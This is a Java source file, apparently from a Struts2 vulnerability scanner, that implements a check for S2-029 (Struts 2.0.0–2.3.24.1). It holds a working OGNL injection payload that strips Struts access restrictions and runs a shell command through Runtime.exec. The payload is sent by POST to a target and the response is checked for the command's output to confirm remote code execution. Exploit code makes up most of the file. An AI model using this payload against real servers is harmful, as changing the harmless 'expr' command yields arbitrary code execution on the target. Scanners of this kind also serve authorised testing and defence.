package struts2scan.payload;

import struts2scan.util.HttpClient;
import struts2scan.util.HttpResult;

import java.net.URL;
import java.util.HashMap;
import java.util.Map;
import java.util.Random;
import java.util.regex.Matcher;
import java.util.regex.Pattern;

public class S2_029 implements Check {
    public String printInfo(){
        String info = "[+] S2-029:影响版本Struts 2.0.0-2.3.24.1(除了2.3.20.3); POST请求发送数据,需要参数; 默认参数:message";
        return info+"\n";
    }

    @Override
    public boolean check(URL url) throws Exception {
        return false;
    }


    @Override
    public boolean check(String protocol, String host, int port,String path) throws Exception{

        Map<String,String> data = new HashMap<String,String>();
        Map<String,String> headers = new HashMap<String,String>();

        int number1 = new Random(10000).nextInt(10000);
        int number2 = new Random(10000).nextInt(10000);
        String poc = "(#_memberAccess['allowPrivateAccess']=true,#_memberAccess['allowProtectedAccess']=true,#_memberAccess['excludedPackageNamePatterns']=#_memberAccess['acceptProperties'],#_memberAccess['excludedClasses']=#_memberAccess['acceptProperties'],#_memberAccess['allowPackageProtectedAccess']=true,#_memberAccess['allowStaticMethodAccess']=true,@org.apache.commons.io.IOUtils@toString(@java.lang.Runtime@getRuntime().exec('expr "+number1+" + "+ number2+"').getInputStream()))";
        data.put("message",poc);
        headers.put("Content-Type","application/x-www-form-urlencoded");

        int numsum = number1+number2;
        if (path==null){
            path = "/index.action";
        }else if(!path.endsWith(".action")){
            path = path+"index.action";
        }

        String url = protocol+"://"+host+":"+port+path;

        try {
            HttpResult result= HttpClient.post(url,data,headers);;
            Pattern p = Pattern.compile(String.valueOf(numsum));
            Matcher m =p.matcher(result.getData());

            if(m.find()){
                return true;
            }else{
                return false;
            }
        }catch (Exception e){
            return false;
        }


        }



}
